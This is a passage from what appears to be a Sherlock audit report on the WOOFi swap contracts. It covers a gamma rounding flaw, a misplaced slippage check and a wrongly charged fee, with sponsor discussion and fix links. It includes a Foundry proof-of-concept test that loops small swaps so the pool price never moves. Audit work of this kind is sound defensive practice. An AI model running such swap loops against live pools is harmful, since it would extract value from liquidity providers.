baseRefPrice = 0.0001 * 1e8;
quoteRefPrice = 60_000 * 1e8;
ceoff = 1e8 (WBTC decimals)

and the result is "0"

I asked Head of Judging and he allowed me to use the new context.

Moreover, the information about which tokens will be used (the ones mentioned in the above comment) was unavailable to watsons, and README says any token. On top of it, it's infact unientended design. Therefore, Medium -> core functionality break -> the `price` function will validate 0 price from chainlink when it shouldn't do this.

# Issue M-5: Swaps can happen without changing the price for the next trade due to gamma = 0 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/42 

The protocol has acknowledged this issue.

## Found by 
mstpr-brainbot
## Summary
When a swap happens in WoofiPool the price is updated accordingly respect to such value "gamma". However, there are some cases where the swap results to a "gamma" value of "0" which will not change the new price for the next trade. 
## Vulnerability Detail
This is how the quote token received and new price is calculated when given amount of base tokens are sold to the pool:
```solidity
function _calcQuoteAmountSellBase(
        address baseToken,
        uint256 baseAmount,
        IWooracleV2.State memory state
    ) private view returns (uint256 quoteAmount, uint256 newPrice) {
        require(state.woFeasible, "WooPPV2: !ORACLE_FEASIBLE");

        DecimalInfo memory decs = decimalInfo(baseToken);

        // gamma = k * price * base_amount; and decimal 18
        uint256 gamma;
        {
            uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;
            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, "WooPPV2: !maxNotionalValue");

            gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;
            require(gamma <= tokenInfos[baseToken].maxGamma, "WooPPV2: !gamma");

            // Formula: quoteAmount = baseAmount * oracle.price * (1 - oracle.k * baseAmount * oracle.price - oracle.spread)
            quoteAmount =
                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *
                    (uint256(1e18) - gamma - state.spread)) /
                1e18 /
                decs.baseDec;
        }

        // newPrice = oracle.price * (1 - k * oracle.price * baseAmount)
        newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;
    }
```

Now, let's assume:
DAI is quoteToken, 18 decimals
tokenX is baseToken which has a price of 0.01 DAI, 18 decimals 
coefficient = 0.000000001 * 1e18
spread = 0.001 * 1e18
baseAmount (amount of tokenX are sold) = 1e10;

first calculate the `gamma`:
(baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;
= 1e10 * 0.01 * 1e8 * 0.000000001 * 1e18 / 1e8 / 1e18
= 0 due to round down

let's calculate the `quoteAmount` will be received:
quoteAmount =
                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *
                    (uint256(1e18) - gamma - state.spread)) /
                1e18 /
                decs.baseDec;
(1e10 * 0.01 * 1e8 * 1e18 / 1e8) * (1e18 - 0 - 0.01 * 1e18) / 1e18 / 1e18
= 99900000 which is not "0". 

let's calculate the new price:
newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;
= (1e18 - 0) * 0.01 * 1e8 / 1e18 = 0.01 * 1e8
**which is the same price, no price changes!** 

That would also means if the "gamma" is "0", then this is the best possible swap outcome. If a user does this in a for loop multiple times in a cheap network, user can trade significant amount of tokens without changing the price. 

**Coded PoC (values are the same as in the above textual scenario):**
```solidity
function test_SwapsHappenPriceIsNotUpdatedDueToRoundDown() public {
        // USDC --> DAI address, mind the naming..
        uint usdcAmount = 1_000_000 * 1e18;
        uint wooAmount = 100_000 * 1e18;
        uint wethAmount = 1_000 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, wooAmount);
        deal(WETH, ADMIN, wethAmount);

        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        pool.depositAll(WETH);
        vm.stopPrank();

        uint wooAmountForTapir = 1e10 * 1000;
        vm.startPrank(TAPIR);
        deal(WOO, TAPIR, wooAmountForTapir);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();

        // WHERE THE MAGIC HAPPENS
        (uint128 price, ) = oracle.woPrice(WOO);
        console.log("price", price);
        
        uint cumulative;
        for (uint i = 0; i < 1000; ++i) {
            vm.prank(TAPIR);
            cumulative += router.swap(WOO, USDC, wooAmountForTapir / 1000, 0, payable(TAPIR), TAPIR);
        }

        (uint128 newPrice, ) = oracle.woPrice(WOO);
        console.log("price", price);

        // price hasnt changed although there are significant amount of tokens are being traded by TAPIR
        assertEq(newPrice, price);
    }
```
## Impact
As by design, the price should change after every trade irrelevant of the amount that is being traded. Also, in a cheap network the attack can be quite realistic. Hence, I'll label this as medium. 
## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L420-L465

https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L591-L619
## Tool used

Manual Review

## Recommendation
if the "gamma" is "0", then revert. 



## Discussion

**fb-alexcq**

Thanks for the feedback.

In your example, your DAI amount is 1e10, which 10^-8 usdc in notional value. With such a small amount, zero gamma looks good here. Could you please come up another test case, with a swap amount at least great than 1 usd (and with swap fee) ?

Thanks in advance.

**WangSecurity**

request poc

**sherlock-admin3**

PoC requested from @mstpr

Requests remaining: **6**

**WangSecurity**

look at the comment above by the sponsor

**mstpr**


@fb-alexcq @WangSecurity 
It all comes down to the network cheapness and coefficient/spread values, if the network is cheap, then doing a many iterations with dust amount will lead to the situation above.

the below example has:
pool.setFeeRate(WOO, 1000);
uint64 private constant INITIAL_SPREAD_WOO = 0.001 * 1e18; 
uint64 private constant INITIAL_COEFF_WOO = 0.00000000000000001 * 1e18;
uint128 private constant INITIAL_PRICE_WOO = 0.01 * 1e8;

swapping 1 WOO, 1000 times in single tx, receives 9.98 DAI in return without changing the price. If done with more iterations the impact is higher.
```solidity
function test_SwapsHappenPriceIsNotUpdatedDueToRoundDown() public {
        // USDC --> DAI address, mind the naming..
        uint usdcAmount = 1_000_000 * 1e18;
        uint wooAmount = 100_000 * 1e18;
        uint wethAmount = 1_000 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, wooAmount);
        deal(WETH, ADMIN, wethAmount);

        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        pool.depositAll(WETH);
        vm.stopPrank();

        uint wooAmountForTapir = 1e18 * 1000;
        vm.startPrank(TAPIR);
        deal(WOO, TAPIR, wooAmountForTapir);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();

        // WHERE THE MAGIC HAPPENS
        (uint128 price, ) = oracle.woPrice(WOO);
        console.log("price", price);
        
        uint cumulative;
        for (uint i = 0; i < 1000; ++i) {
            vm.prank(TAPIR);
            cumulative += router.swap(WOO, USDC, wooAmountForTapir / 1000, 0, payable(TAPIR), TAPIR);
        }

        (uint128 newPrice, ) = oracle.woPrice(WOO);
        console.log("price", price);

        console.log("Cumulative", cumulative);

        // price hasnt changed although there are significant amount of tokens are being traded by TAPIR
        assertEq(newPrice, price);
    }
```

**fb-alexcq**

For me, it still looks legit when the swap amount is so small (with such a low coef slippage), the gamma could be 0. You think about when you trade 1 dai to usdc, you probably ended up with no slippage.

But to make the judgement more rigorous, I'm double checking with our algorithm dev. 

**WangSecurity**

@fb-alexcq have you checked with the algorithm dev?

**fb-alexcq**

We decided to give the credit to the Watson. And have been come up with this fix: https://github.com/woonetwork/WooPoolV2/pull/114 

In engineering perspective, it's impossible to deduce a zero gamma, but we decided to take more sanity check here , w/o costing too much gas.


# Issue M-6: `WooCrossChainRouterV4.crossSwap()` doesn't correctly check for slippage 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/85 

## Found by 
hals
## Summary

`WooCrossChainRouterV4.crossSwap()` doesn't correctly check for slippage, as it deducts external swapping fees after checking for the minimum bridged amount determined by the user.

## Vulnerability Detail

- `WooCrossChainRouterV4.crossSwap()` function is meant to enable users from executing a cross-chain swap, where a cross chain swap transaction may include all or some of the following steps (as per the documentation):

> 1. Swap asset **A** in the user's wallet to asset **B** in WOOFi on the source chain
> 2. Then bridging asset **B** to asset **C** on the destination chain via Stargate (asset B and asset C are of the same value)
> 3. Then swap asset **C** to asset **D** in WOOFi on the destination chain and send to the wallet instructed by the user.

- So swapping from asset **A** to asset **B** on the source chain can be done either using a woofi pool (`WooPPV2`) via `wooRouter.swap()`, or this swap can be done via an external aggregater (where 1inch aggregator is going to be used) via ` wooRouter.externalSwap()` that redirects the swap call to the external aggregator:

  ```javascript
  // Step 2: local swap by 1inch router
              if (srcInfos.fromToken != srcInfos.bridgeToken) {
                  TransferHelper.safeApprove(srcInfos.fromToken, address(wooRouter), srcInfos.fromAmount);
                  if (src1inch.swapRouter != address(0)) {
                      // external swap via 1inch
                       bridgeAmount = wooRouter.externalSwap(
                        src1inch.swapRouter,
                        src1inch.swapRouter,
                        srcInfos.fromToken,
                        srcInfos.bridgeToken,
                        srcInfos.fromAmount,
                        srcInfos.minBridgeAmount,
                        payable(address(this)),
                        src1inch.data
                    );

                      fee = (bridgeAmount * srcExternalFeeRate) / FEE_BASE;
                  } else {
                  //some code...
          }

          // Step 3: deduct the swap fee
          bridgeAmount -= fee;
  ```

  where the resulted `bridgeAmount` will be checked to be > `srcInfos.minBridgeAmount` in the `wooRouter.externalSwap()`:

  ```javascript
  function externalSwap(
          address approveTarget,
          address swapTarget,
          address fromToken,
          address toToken,
          uint256 fromAmount,
          uint256 minToAmount,
          address payable to,
          bytes calldata data
      ) external payable override nonReentrant returns (uint256 realToAmount) {
          //some code...

          require(realToAmount >= minToAmount && realToAmount > 0, "WooRouter: realToAmount_NOT_ENOUGH");

          //some code...
      }
  ```

## Impact

But as can be noticed, an external swap fee is deducted from the `bridgeAmount` after the swap is done via an external aggregator (1inch aggregator) and after checking that the `bridgeAmount` is sufficient as per detrmined by the user (` > srcInfos.minBridgeAmount`), and this might result in the `bridgeAmount` being less than required by the user `srcInfos.minBridgeAmount`.

## Code Snippet

[WooCrossChainRouterV4.crossSwap function/L137-L138](https://github.com/woonetwork/WooPoolV2/blob/a99e13de1492c17a325fff6cddb3696cd7db7dc9/contracts/CrossChain/WooCrossChainRouterV4.sol#L137C1-L138C29)

```javascript
   // Step 2: local swap by 1inch router
            if (srcInfos.fromToken != srcInfos.bridgeToken) {
                TransferHelper.safeApprove(srcInfos.fromToken, address(wooRouter), srcInfos.fromAmount);
                if (src1inch.swapRouter != address(0)) {
                    // external swap via 1inch
                    bridgeAmount = wooRouter.externalSwap(
                        src1inch.swapRouter,
                        src1inch.swapRouter,
                        srcInfos.fromToken,
                        srcInfos.bridgeToken,
                        srcInfos.fromAmount,
                        srcInfos.minBridgeAmount,
                        payable(address(this)),
                        src1inch.data
                    );

                    fee = (bridgeAmount * srcExternalFeeRate) / FEE_BASE;
                } else {

                //some code...
        }

        // Step 3: deduct the swap fee
        bridgeAmount -= fee;
```

## Tool used

Manual Review

## Recommendation

Update `WooCrossChainRouterV4.crossSwap()` to check for the `bridgeAmount` being greater than the amount determined by the user `srcInfos.minBridgeAmount` after deducting the fees:

```diff
    function crossSwap(
        uint256 refId,
        address payable to,
        SrcInfos memory srcInfos,
        DstInfos calldata dstInfos,
        Src1inch calldata src1inch,
        Dst1inch calldata dst1inch
    ) external payable whenNotPaused nonReentrant {

    //some code...

   // Step 2: local swap by 1inch router
            if (srcInfos.fromToken != srcInfos.bridgeToken) {
                TransferHelper.safeApprove(srcInfos.fromToken, address(wooRouter), srcInfos.fromAmount);
                if (src1inch.swapRouter != address(0)) {
                    // external swap via 1inch
                    bridgeAmount = wooRouter.externalSwap(
                        src1inch.swapRouter,
                        src1inch.swapRouter,
                        srcInfos.fromToken,
                        srcInfos.bridgeToken,
                        srcInfos.fromAmount,
                        srcInfos.minBridgeAmount,
                        payable(address(this)),
                        src1inch.data
                    );

                    fee = (bridgeAmount * srcExternalFeeRate) / FEE_BASE;
                } else {

                //some code...
        }

        // Step 3: deduct the swap fee
        bridgeAmount -= fee;

+       require(bridgeAmount >= srcInfos.minBridgeAmount, "insufficient bridged amount");

        //some code...
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/woonetwork/WooPoolV2/pull/112/commits/151443bf3c780f4e45796312591c61e1bd188122.

**WangSecurity**

Initially, it was selected as a duplicate of 141, but it's not. 141 is invalid and 85 is valid.

# Issue M-7: In the function _handleERC20Received, the fee was incorrectly charged 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/114 

## Found by 
Aamirusmani1552, Nyx, aman, charles\_\_cheerful, hals, mstpr-brainbot, petro1912, yotov721, zraxx
## Summary

In the function _handleERC20Received, the fee was incorrectly charged.

## Vulnerability Detail

In the contract, when external swap occurs, a portion of the fee will be charged. However, in function _handleERC20Received, the fee is also charged in internal swap.

```solidity
} else {
    // Deduct the external swap fee
    uint256 fee = (bridgedAmount * dstExternalFeeRate) / FEE_BASE;
    bridgedAmount -= fee;  // @@audit: fee should not be applied to internal swap 

    TransferHelper.safeApprove(bridgedToken, address(wooRouter), bridgedAmount);
    if (dst1inch.swapRouter != address(0)) {
        try
            wooRouter.externalSwap(
```

At the same time, when the internal swap fails, this part of the fee will not be returned to the user.

## Impact

Internal swaps are incorrectly charged, and fees are not refunded when internal swap fail.

## Code Snippet

https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L412-L414

https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L478

## Tool used

Manual Review

## Recommendation

Apply fee calculation only to external swaps.

```dart
function _handleERC20Received(
    uint256 refId,
    address to,
    address toToken,
    address bridgedToken,
    uint256 bridgedAmount,
    uint256 minToAmount,
    Dst1inch memory dst1inch
) internal {
    address msgSender = _msgSender();

    // ...

    } else {
        if (dst1inch.swapRouter != address(0)) {
            // Deduct the external swap fee
            uint256 fee = (bridgedAmount * dstExternalFeeRate) / FEE_BASE;
            bridgedAmount -= fee;  

            TransferHelper.safeApprove(bridgedToken, address(wooRouter), bridgedAmount);
            try
                wooRouter.externalSwap(
                    // ...
                )
            returns (uint256 realToAmount) {
                emit WooCrossSwapOnDstChain(
                    // ...
                );
            } catch {
                bridgedAmount += fee;
                TransferHelper.safeTransfer(bridgedToken, to, bridgedAmount);
                emit WooCrossSwapOnDstChain(
                    // ...
                );
            }
        } else {
            TransferHelper.safeApprove(bridgedToken, address(wooRouter), bridgedAmount);
            try wooRouter.swap(bridgedToken, toToken, bridgedAmount, minToAmount, payable(to), to) returns (
                uint256 realToAmount
            ) {
               // ...
            } catch {
                // ...
            }
        }
    }
}
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/woonetwork/WooPoolV2/pull/112/commits/be8655bf5d9660684eff1e2c12ff5d140fddc474.

